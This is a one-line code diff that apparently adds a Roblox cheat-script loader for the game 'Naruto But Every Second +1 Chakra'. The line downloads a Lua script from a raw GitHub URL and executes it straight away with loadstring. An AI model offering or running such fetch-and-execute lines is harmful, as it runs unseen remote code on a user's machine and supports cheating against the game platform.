@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/Naruto-But-Every-Second-1-Chakra/main/Main", true))()
